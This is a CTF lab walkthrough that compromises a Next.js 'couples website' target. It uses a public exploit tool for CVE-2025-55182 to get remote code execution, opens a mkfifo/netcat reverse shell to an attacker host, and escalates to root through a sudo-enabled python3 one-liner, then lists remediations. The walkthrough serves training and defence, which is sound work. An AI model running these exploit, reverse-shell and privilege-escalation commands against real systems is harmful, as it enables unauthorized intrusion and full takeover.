# Romance and Co - CTF Walkthrough

**Target:** 10.48.156.122:3000<br>
**Application:** Next.js Web Application (Couples Website)  
**Vulnerability:** CVE-2025-55182 (React Server Components RCE)

---

## Step 1: Reconnaissance

### 1.1 Network Scanning
Identify open ports and services on the target:

```bash
sudo nmap -sC -sV 10.48.156.122
```

**Output:**
- 22/tcp open ssh
- 3000/tcp open http

**Analysis:** Port 3000 is running HTTP. This is the target application.

### 1.2 Web Application Enumeration
Visit the application in a browser: `http://10.48.156.122:3000`

**Observation:** Romance and Co. couples website homepage loads successfully.

### 1.3 Directory Enumeration
Perform directory brute-forcing to discover endpoints:
```bash
gobuster dir -u http://10.48.156.122:3000 -w /usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt
```

**Output:**
- .git/logs/ (Status: 308) [Size: 10]
- cgi-bin/ (Status: 308) [Size: 8]
- render/ (Status: 308) [Size: 29]
- render?url= (Status: 308) [Size: 35]

**Analysis:** 
- All endpoints return 308 (redirect) responses
- These are **false positives** - Next.js framework is redirecting requests, not actually exposing these paths
- The attack surface appears limited to advertised endpoints
- No hidden administrative interfaces discovered

---

## Step 2: Vulnerability Identification

### 2.1 Automated Vulnerability Scanning
Use nuclei to identify known CVEs affecting the application:

```bash
nuclei -u http://10.48.156.122:3000
```

**Vulnerabilities Detected:**
- ✅ **CVE-2025-55182** - React Server Components RCE (CRITICAL)
- ⚠️ CVE-2025-55184 - Denial of Service (will not exploit)

**Analysis:** CVE-2025-55182 allows unauthenticated remote code execution through insecure Flight protocol deserialization. This is our primary attack vector.

---

## Step 3: Exploitation - Initial RCE

### 3.1 Clone CVE-2025-55182 Exploit Tool
The react2shell (r2sae.py) tool automates exploitation of this vulnerability:

```bash
git clone https://github.com/sammwyy/r2sae
cd r2sae
```

### 3.2 Launch Interactive Shell
Start the exploit tool in interactive mode:
```bash
python r2sae.py shell http://10.48.156.122:3000
```

**Output:**
```
██████╗ ██████╗ ███████╗ █████╗ ███████╗
██╔══██╗╚════██╗██╔════╝██╔══██╗██╔════╝
██████╔╝ █████╔╝███████╗███████║█████╗
██╔══██╗██╔═══╝ ╚════██║██╔══██║██╔══╝
██║ ██║███████╗███████║██║ ██║███████╗
╚═╝ ╚═╝╚══════╝╚══════╝╚═╝ ╚═╝╚══════╝
React2Shell Auto-Exploit
⚠ For authorized testing only ⚠

[] Interactive mode enabled
[] Target: http://10.48.156.122:3000
[*] Type 'exit' or 'quit' to exit
```

### 3.3 Verify Command Execution
Execute basic reconnaissance commands:

```bash
Shell: whoami
> (http://10.48.156.122:3000) daniel

Shell: id
> (http://10.48.156.122:3000) uid=100(daniel) gid=101(secgroup) groups=101(secgroup)

Shell: pwd
> (http://10.48.156.122:3000) /app
```

**Analysis:**
- ✅ Commands execute successfully as user `daniel` (uid=100)
- ✅ Application runs in `/app` directory
- ✅ RCE confirmed; we have arbitrary code execution

**Note:** Commands like `ls -la` don't return output in redirect headers, but system commands execute.

---

## Step 4: Establish Persistent Shell Access

### 4.1 Set Up Listener on Attacker Machine
Open a netcat listener to receive the reverse shell:

```bash
nc -lvnp 9001
```

### 4.2 Create Reverse Shell Payload
Execute a mkfifo-based reverse shell command via react2shell:

```bash
python r2sae.py exec http://10.48.156.122:3000 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [Attacker-IP] 9001 >/tmp/f"
```

**Payload Breakdown:**
```bash
rm /tmp/f                          # Remove existing pipe (if any)
mkfifo /tmp/f                      # Create named pipe
cat /tmp/f|sh -i 2>&1              # Read from pipe and execute shell commands
|nc [Attacker-IP] 9001 >/tmp/f   # Send output to attacker's netcat listener
```

**Output:**
```
[*] Executing on: http://10.48.156.122:3000
(Out) http://10.48.156.122:3000: Command executed (timeout expected)
```

### 4.3 Receive Reverse Shell
The netcat listener receives the connection:

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [Attacker-IP] from [10.48.156.122] 55432
sh-5.0$
```

**Success:** Interactive shell access as `daniel` user achieved.

### 4.4 Retrieve User Flag
Navigate to daniel's home directory and capture the flag:

```bash
cd ~
ls -la
cat user.txt
```

**Flag:** `USER_FLAG{...}`

---

## Step 5: Privilege Escalation

### 5.1 Enumerate Sudo Permissions
Check what commands `daniel` can run with sudo:

```bash
sudo -l -l
```

**Output:**
```
Matching Defaults entries for daniel on target:
use_pty, logfile=/var/log/sudo.log, lecture=never

User daniel may run the following commands on target:
(root) NOPASSWD: /usr/bin/python3
```

**Analysis:**
- ✅ daniel can execute Python 3 as root WITHOUT a password
- ✅ No script restrictions - this includes the `-c` flag for inline code
- ✅ Python's `os.system()` can spawn a shell, bypassing restrictions

### 5.2 Exploit Python to Spawn Root Shell
Execute a Python one-liner that spawns an interactive shell as root:

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

**Payload Explanation:**
```
sudo python3 -c # Execute Python code as root
'import os; # Import os module
os.system("/bin/sh")' # Spawn /bin/sh with root privileges
```

**Output:**
```
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

**Success:** Root shell access achieved.

### 5.3 Retrieve Root Flag
Navigate to the root directory and capture the final flag:

```bash
cd /root
ls -la
cat root.txt
```

**Flag:** `ROOT_FLAG{...}`

---

## Summary

| Phase | Command | User | Status |
|-------|---------|------|--------|
| Reconnaissance | nmap, gobuster, nuclei | - | ✅ Completed |
| Vulnerability Scan | nuclei | - | ✅ CVE-2025-55182 found |
| Initial RCE | python r2sae.py shell | daniel | ✅ Achieved |
| Reverse Shell | mkfifo + nc | daniel | ✅ Achieved |
| User Flag | cat ~/user.txt | daniel | ✅ Retrieved |
| Privilege Escalation | sudo python3 -c | root | ✅ Achieved |
| Root Flag | cat /root/root.txt | root | ✅ Retrieved |

---
**Total Time to Compromise:** ~150 minutes  
**Total Commands Executed:** 20+  
**Attack Surface Used:** Flight Protocol deserialization + Sudo misconfiguration

---

## Key Lessons

1. **Automated tools (nuclei) are essential** - Manually testing paths would have missed CVE-2025-55182
2. **Reverse shell persistence matters** - RCE in redirect headers limits output; reverse shell provides interactive access
3. **Sudo enumeration is critical** - Often the stepping stone from user to root compromise
4. **Python `-c` flag is dangerous** - Allows arbitrary code execution; should be restricted in sudoers
5. **Defense in depth fails** - One vulnerability (RCE) + one misconfiguration (sudo) = complete compromise

---

## Remediation Applied (For Defense)

✅ Update React/Next.js to patch CVE-2025-55182  
✅ Remove `-c` flag from Python sudo permissions  
✅ Implement input validation on Flight protocol  
✅ Deploy WAF to detect malicious payloads  
✅ Regular sudo permission audits